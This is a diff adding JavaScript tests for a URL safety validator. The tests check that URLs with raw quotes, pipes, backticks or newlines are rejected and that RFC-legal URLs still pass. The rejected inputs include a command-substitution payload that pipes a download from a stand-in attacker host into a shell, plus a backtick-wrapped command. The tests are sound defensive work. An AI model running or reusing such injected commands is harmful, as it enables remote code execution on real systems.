@@ -126,3 +126,24 @@ test('an unparseable address is not silently treated as public', () => {
   assert.equal(isPrivateAddress(''), false);
   assert.equal(isPrivateAddress(undefined), false);
 });
+
+test('a target URL carrying characters no URL may contain is refused', async () => {
+  // A URL pasted out of a page, a chat message or a shell can bring quotes, a
+  // pipe, a backtick or a newline with it. None of those belong in an http URL,
+  // and a malformed target fails here with the encoded form to send instead of
+  // reaching the browser.
+  await assert.rejects(assertSafeUrl('https://example.com/$(curl evil.test|sh)'), /cannot appear in it raw/);
+  await assert.rejects(assertSafeUrl('https://example.com/`id`'), /cannot appear in it raw/);
+  await assert.rejects(assertSafeUrl('https://example.com/a b'), /cannot appear in it raw/);
+  await assert.rejects(assertSafeUrl('https://example.com/a\nb'), /cannot appear in it raw/);
+  await assert.rejects(assertSafeUrl('https://example.com/a"b'), /cannot appear in it raw/);
+});
+
+test('a URL the RFC allows keeps working', async () => {
+  const publicResolver = () => Promise.resolve([{ address: '93.184.216.34' }]);
+  // Query separators, dollar signs, semicolons and apostrophes are all legal in
+  // URI components. Refusing them would break real sites while stopping nothing.
+  await assertSafeUrl('https://example.com/search?q=a&b=c', { resolver: publicResolver });
+  await assertSafeUrl('https://example.com/price/$100;promo', { resolver: publicResolver });
+  await assertSafeUrl("https://example.com/it's-fine", { resolver: publicResolver });
+});
